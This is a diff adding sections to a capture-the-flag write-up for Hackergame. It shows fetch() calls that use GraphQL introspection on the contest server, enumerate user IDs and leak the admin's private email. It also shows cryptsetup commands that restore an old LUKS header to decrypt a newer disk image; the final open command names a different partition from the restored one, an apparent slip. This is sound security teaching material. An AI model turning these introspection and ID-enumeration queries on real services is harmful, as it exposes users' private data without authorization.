@@ -60,6 +60,227 @@ Finally print it with echo -e, and you'll get the flag.
 
 ## 图之上的信息
 
+According to the description of the task, we know that the website is using GraphQL to communicate with its backend.
+
+After logging in, we can see from browser DevTools that a GraphQL request is sent out to retrieve notes.
+
+What should we do? We can take a look at graphql.org. Then we find this page [Introspection](https://graphql.org/learn/introspection/).
+
+Just do everything it said. First, we should ask the GraphQL endpoint what types are available.
+
+```javascript
+fetch("http://202.38.93.111:15001/graphql", {
+  "headers": {
+    "accept": "application/json, text/plain, */*",
+    "accept-language": "en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7",
+    "content-type": "application/json",
+    "proxy-connection": "keep-alive"
+  },
+  "referrer": "http://202.38.93.111:15001/notes",
+  "referrerPolicy": "strict-origin-when-cross-origin",
+  "body": JSON.stringify({query:`{
+  __schema {
+    types {
+      name
+    }
+  }
+}`}),
+  "method": "POST",
+  "mode": "cors",
+  "credentials": "include"
+});
+// Result:
+{
+    "data": {
+        "__schema": {
+            "types": [
+                {
+                    "name": "Query"
+                },
+                {
+                    "name": "GNote"
+                },
+                {
+                    "name": "Int"
+                },
+                {
+                    "name": "String"
+                },
+                {
+                    "name": "GUser"
+                },
+                ...
+            ]
+        }
+    }
+}
+```
+Note that there's a GUser named similarly to GNote. So maybe the GUser type is used for describing a user.
+
+Let's check what fields appear in GUser.
+```javascript
+fetch("http://202.38.93.111:15001/graphql", {
+  "headers": {
+    "accept": "application/json, text/plain, */*",
+    "accept-language": "en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7",
+    "content-type": "application/json",
+    "proxy-connection": "keep-alive"
+  },
+  "referrer": "http://202.38.93.111:15001/notes",
+  "referrerPolicy": "strict-origin-when-cross-origin",
+  "body": JSON.stringify({query:`{
+  __type(name: "GUser") {
+    name
+    fields {
+      name
+      type {
+        name
+        kind
+      }
+    }
+  }
+}`}),
+  "method": "POST",
+  "mode": "cors",
+  "credentials": "include"
+});
+// Result:
+{
+    "data": {
+        "__type": {
+            "name": "GUser",
+            "fields": [
+                {
+                    "name": "id",
+                    "type": {
+                        "name": "Int",
+                        "kind": "SCALAR"
+                    }
+                },
+                {
+                    "name": "username",
+                    "type": {
+                        "name": "String",
+                        "kind": "SCALAR"
+                    }
+                },
+                {
+                    "name": "privateEmail",
+                    "type": {
+                        "name": "String",
+                        "kind": "SCALAR"
+                    }
+                }
+            ]
+        }
+    }
+}
+```
+So we know the field which contains email is called `privateEmail`.
+
+Next, we should find out what queries are available for us.
+```javascript
+fetch("http://202.38.93.111:15001/graphql", {
+  "headers": {
+    "accept": "application/json, text/plain, */*",
+    "accept-language": "en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7",
+    "content-type": "application/json",
+    "proxy-connection": "keep-alive"
+  },
+  "referrer": "http://202.38.93.111:15001/notes",
+  "referrerPolicy": "strict-origin-when-cross-origin",
+  "body": JSON.stringify({query:`{
+  __schema {
+    queryType {
+      fields {
+        name
+      }
+    }
+  }
+}`}),
+  "method": "POST",
+  "mode": "cors",
+  "credentials": "include"
+});
+// Result:
+{
+    "data": {
+        "__schema": {
+            "queryType": {
+                "fields": [
+                    {
+                        "name": "note"
+                    },
+                    {
+                        "name": "notes"
+                    },
+                    {
+                        "name": "user"
+                    }
+                ]
+            }
+        }
+    }
+}
+```
+According to the request for notes, we can know our `userId` is 2. So the admin's is probably 1. Then finally we can write a similar request to get admin's email.
+```javascript
+fetch("http://202.38.93.111:15001/graphql", {
+  "headers": {
+    "accept": "application/json, text/plain, */*",
+    "accept-language": "en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7",
+    "content-type": "application/json",
+    "proxy-connection": "keep-alive"
+  },
+  "referrer": "http://202.38.93.111:15001/notes",
+  "referrerPolicy": "strict-origin-when-cross-origin",
+  "body": JSON.stringify({query:`{
+  user(id: 1){
+      privateEmail
+  }
+}`}),
+  "method": "POST",
+  "mode": "cors",
+  "credentials": "include"
+});
+// Result:
+{
+    "data": {
+        "user": {
+            "privateEmail": "flag{dont_let_graphql_l3ak_data_3940369369@hackergame.ustc}"
+        }
+    }
+}
+```
+
 ## 加密的U盘
+
+To solve this task, we should find out how does LUKS work. On this [FAQ Page](https://gitlab.com/cryptsetup/cryptsetup/-/wikis/FrequentlyAskedQuestions)(I found this through Wikipedia), it describes LUKS as "multiple user keys with one master key". 
+
+That means our data is encrypted with a master key which won't change unless you reformat the disk, then it uses our user key to encrypt that master key. If we need to change the user key, then it only needs to re-encrypt the master key, instead of re-encrypting the whole disk.
+
+So, if we use the image of first day to get that master key, then use the master key to directly decrypt the second one, we can get the flag.
+
+Easier implementation is just backing up the whole LUKS header of the first image then recover it to the second one. That can be done with these commands.
+
+```shell
+# Setup images as loop device
+sudo losetup -P /dev/loop101 day1.img
+sudo losetup -P /dev/loop102 day2.img
+
+# Back up the header of the 1st image
+sudo cryptsetup luksHeaderBackup /dev/loop101p1 --header-backup-file=luks-header
+
+# Then restore to the 2nd image
+sudo cryptsetup luksHeaderRestore /dev/loop102p1 --header-backup-file=luks-header
+
+# Mount the 2nd image with the password of first image
+sudo cryptsetup luksOpen /dev/loop102p2 day2
+mkdir day2
+sudo mount /dev/mapper/day2 day2
+
+# Get the flag
+cat day2/flag.txt
+```
 
 ## 阵列恢复大师
